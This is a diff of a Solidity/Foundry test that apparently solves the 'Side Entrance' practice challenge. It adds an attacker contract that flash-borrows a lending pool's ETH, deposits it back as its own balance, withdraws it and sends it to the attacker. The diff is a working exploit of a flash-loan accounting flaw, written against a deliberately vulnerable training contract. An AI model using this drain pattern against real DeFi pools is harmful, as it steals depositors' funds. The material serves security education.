@@ -6,7 +6,27 @@ import {Utilities} from "../../utils/Utilities.sol";
 import {console} from "../../utils/Console.sol";
 import {Vm} from "forge-std/Vm.sol";
 
-import {SideEntranceLenderPool} from "../../../Contracts/side-entrance/SideEntranceLenderPool.sol";
+import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../../Contracts/side-entrance/SideEntranceLenderPool.sol";
+
+contract AttackerContract is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool private immutable pool;
+
+    constructor(SideEntranceLenderPool _pool) {
+        pool = _pool;
+    }
+
+    receive() external payable {}
+
+    function attack(uint256 amount) external {
+        pool.flashLoan(amount);
+        pool.withdraw();
+        payable(msg.sender).call{value: amount}("");
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+}
 
 contract SideEntrance is DSTest {
     Vm internal immutable vm = Vm(HEVM_ADDRESS);
@@ -39,6 +59,15 @@ contract SideEntrance is DSTest {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        // The pool is vulnerable because the attacker is able to deposit borrowed ETH
+        vm.startPrank(attacker);
+
+        AttackerContract attackerContract = new AttackerContract(
+            sideEntranceLenderPool
+        );
+        attackerContract.attack(ETHER_IN_POOL);
+
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
